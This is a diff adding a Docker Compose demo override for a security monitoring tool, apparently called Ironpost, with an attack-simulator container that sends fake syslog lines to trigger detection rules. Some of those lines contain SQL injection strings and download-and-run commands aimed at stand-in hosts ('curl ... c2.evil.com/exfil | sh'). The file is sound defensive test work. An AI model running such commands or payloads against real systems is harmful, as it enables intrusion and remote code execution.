@@ -1,0 +1,114 @@
+# Ironpost Demo Compose Override
+# This file extends docker-compose.yml with demo workloads and attack simulation.
+#
+# Usage:
+#   docker compose -f docker-compose.yml -f docker-compose.demo.yml up
+#
+# Architecture:
+#   postgresql, redis (healthy)
+#     └─> ironpost (healthy, with demo config)
+#          ├─> nginx (demo workload)
+#          ├─> log-generator (sends normal logs every 5s)
+#          └─> attack-simulator (waits 10s, then triggers detection rules)
+
+services:
+  # Override ironpost service with demo configuration
+  ironpost:
+    volumes:
+      # Replace production config with demo config
+      - ./demo/ironpost-demo.toml:/etc/ironpost/ironpost.toml:ro
+      # Mount demo detection rules
+      - ./demo/rules:/etc/ironpost/rules:ro
+      # Enable docker socket for container monitoring demo
+      - /var/run/docker.sock:/var/run/docker.sock:ro
+    environment:
+      # Override with demo settings (lower thresholds, debug logging)
+      IRONPOST_GENERAL_LOG_LEVEL: debug
+      IRONPOST_CONTAINER_ENABLED: "true"
+      IRONPOST_CONTAINER_AUTO_ISOLATE: "true"
+      IRONPOST_SBOM_ENABLED: "true"
+
+  # Nginx - Demo workload for container isolation
+  nginx:
+    image: nginx:alpine
+    container_name: ironpost-demo-nginx
+    restart: unless-stopped
+    ports:
+      - "8888:80"
+    networks:
+      - ironpost-net
+    labels:
+      # Security policy metadata for container-guard
+      com.ironpost.policy: "web-server"
+      com.ironpost.isolate: "pause"
+    healthcheck:
+      test: ["CMD", "wget", "--quiet", "--tries=1", "--spider", "http://localhost/"]
+      interval: 10s
+      timeout: 5s
+      retries: 3
+
+  # Log Generator - Sends normal syslog messages to ironpost
+  log-generator:
+    image: alpine:latest
+    container_name: ironpost-log-generator
+    restart: unless-stopped
+    networks:
+      - ironpost-net
+    depends_on:
+      ironpost:
+        condition: service_healthy
+    command: >
+      sh -c '
+      echo "Starting log generator...";
+      while true; do
+        echo "<14>1 $(date -u +"%Y-%m-%dT%H:%M:%SZ") log-generator sshd - - - Accepted publickey for user from 192.168.1.100 port 54321" | nc -u -w1 ironpost 1514;
+        echo "<30>1 $(date -u +"%Y-%m-%dT%H:%M:%SZ") log-generator nginx - - - GET /index.html 200 OK" | nc -u -w1 ironpost 1514;
+        echo "<38>1 $(date -u +"%Y-%m-%dT%H:%M:%SZ") log-generator systemd - - - Service started: nginx.service" | nc -u -w1 ironpost 1514;
+        sleep 5;
+      done
+      '
+
+  # Attack Simulator - Generates suspicious patterns to trigger alerts
+  attack-simulator:
+    image: alpine:latest
+    container_name: ironpost-attack-simulator
+    restart: "no"
+    networks:
+      - ironpost-net
+    depends_on:
+      ironpost:
+        condition: service_healthy
+    command: >
+      sh -c '
+      echo "Waiting 10 seconds for ironpost to be fully ready...";
+      sleep 10;
+      echo "Starting attack simulation...";
+
+      echo "==> Simulating SSH brute force attack (3 attempts in 60 seconds)...";
+      for i in 1 2 3; do
+        echo "<38>1 $(date -u +"%Y-%m-%dT%H:%M:%SZ") attacker sshd - - - Failed password for root from 203.0.113.42 port 12345" | nc -u -w1 ironpost 1514;
+        sleep 2;
+      done;
+      sleep 5;
+
+      echo "==> Simulating SQL injection attempts...";
+      echo "<38>1 $(date -u +"%Y-%m-%dT%H:%M:%SZ") attacker nginx - - - GET /login?user=admin&pass='' OR ''1''=''1 403" | nc -u -w1 ironpost 1514;
+      echo "<38>1 $(date -u +"%Y-%m-%dT%H:%M:%SZ") attacker nginx - - - POST /api/search query=\"; DROP TABLE users; --\" 500" | nc -u -w1 ironpost 1514;
+      sleep 5;
+
+      echo "==> Simulating privilege escalation...";
+      echo "<38>1 $(date -u +"%Y-%m-%dT%H:%M:%SZ") attacker sudo - - - user attempted to run sudo -i (unauthorized)" | nc -u -w1 ironpost 1514;
+      sleep 5;
+
+      echo "==> Simulating suspicious command execution...";
+      echo "<38>1 $(date -u +"%Y-%m-%dT%H:%M:%SZ") attacker bash - - - wget http://malicious.example.com/payload.sh -O /tmp/exploit.sh" | nc -u -w1 ironpost 1514;
+      echo "<38>1 $(date -u +"%Y-%m-%dT%H:%M:%SZ") attacker bash - - - curl -s http://c2.evil.com/exfil | sh" | nc -u -w1 ironpost 1514;
+      sleep 5;
+
+      echo "==> Simulating port scan activity...";
+      for port in 22 23 80 443 3306 5432 6379 8080; do
+        echo "<38>1 $(date -u +"%Y-%m-%dT%H:%M:%SZ") attacker kernel - - - SYN packet to port $port from 198.51.100.99" | nc -u -w1 ironpost 1514;
+      done;
+
+      echo "Attack simulation complete. Check ironpost logs for alerts.";
+      '
